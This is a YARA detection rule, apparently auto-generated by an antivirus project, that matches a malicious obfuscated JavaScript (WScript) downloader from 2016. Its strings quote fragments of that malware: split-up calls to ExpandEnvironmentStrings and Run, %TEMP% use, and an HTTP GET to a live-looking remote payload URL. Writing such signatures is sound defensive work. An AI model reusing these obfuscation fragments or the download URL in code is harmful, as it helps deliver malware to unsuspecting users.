rule sig_20160428_8b1392f73ce0ed3be64c2de1a5b54d79 {
  meta:
    description = "datamaliciousorder - file 20160428_8b1392f73ce0ed3be64c2de1a5b54d79.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af3f529d594c048bcf7ff68e0abc93755ef5d5705e151a4aae2a71a20c923d85"

  strings:
    $s1  = "function LjqAgeUzjHqqHkoFjqKbx() {return QcrZgvBahErcZjxLgbBxc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function GwtJwhDyrJnyLpdPxyLno(DcoQvpWplIyuJgnVkeLnj){QcrZgvBahErcZjxLgbBxc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function GwtJwhDyrJnyLpdPxyLno(DcoQvpWplIyuJgnVkeLnj){QcrZgvBahErcZjxLgbBxc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return AhmBoaEukPkiVvpHsyBya - PgmOkqVilDecXuxJyoZbg;};" fullword ascii
    $s5  = "var QcrZgvBahErcZjxLgbBxc = function WnfMkkOixGhnVviSkgZtn() {return QxnHqxPglDwnQrsFxzZvj[MyoPlvEqyBajJmrHfgFwi](\"WScript\"+\"" ascii
    $s6  = "function OvuXdbRgqNjoGguKuxNcs(AhmBoaEukPkiVvpHsyBya, PgmOkqVilDecXuxJyoZbg){DquJsyBkrKzqDvrXujHol = DquJsyBkrKzqDvrXujHol * 1; " ascii
    $s7  = "RgfUceUfcUkdBkuEahNcl[SfpNvdEzqIptFxhOtdZgt](\"G\" + \"ET\", \"http://alex-naumov.ru/j8skdwq\", false);" fullword ascii
    $s8  = "var QcrZgvBahErcZjxLgbBxc = function WnfMkkOixGhnVviSkgZtn() {return QxnHqxPglDwnQrsFxzZvj[MyoPlvEqyBajJmrHfgFwi](\"WScript\"+\"" ascii
    $s9  = "var QxnHqxPglDwnQrsFxzZvj = this[\"WScript\"];" fullword ascii
    $s10 = "function LjqAgeUzjHqqHkoFjqKbx() {return QcrZgvBahErcZjxLgbBxc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function OvuXdbRgqNjoGguKuxNcs(AhmBoaEukPkiVvpHsyBya, PgmOkqVilDecXuxJyoZbg){DquJsyBkrKzqDvrXujHol = DquJsyBkrKzqDvrXujHol * 1; " ascii
    $s12 = "function CqvKlaFumRcgZbmXqbBum(){return XolTjpFivQryWyoGfvUrx + \"\";};" fullword ascii
    $s13 = "if (RgfUceUfcUkdBkuEahNcl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function RybAryPxyVjuLcpQlyVvk() {return ((UolZgyHhrHmkSqeWwdYuu == true) && (UolZgyHhrHmkSqeWwdYuu == BaaUxjRtiBydVkuHxyVpr)) ?" ascii
    $s15 = "function RybAryPxyVjuLcpQlyVvk() {return ((UolZgyHhrHmkSqeWwdYuu == true) && (UolZgyHhrHmkSqeWwdYuu == BaaUxjRtiBydVkuHxyVpr)) ?" ascii
    $s16 = "EypLjoWtyEbpHdfGftMjr = true;" fullword ascii
    $s17 = "var BaaUxjRtiBydVkuHxyVpr = false;" fullword ascii
    $s18 = "function GilCugDpvSztQjgRofCzl(){return MyoPlvEqyBajJmrHfgFwi;};" fullword ascii
    $s19 = "var EypLjoWtyEbpHdfGftMjr = false;" fullword ascii
    $s20 = "var UolZgyHhrHmkSqeWwdYuu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}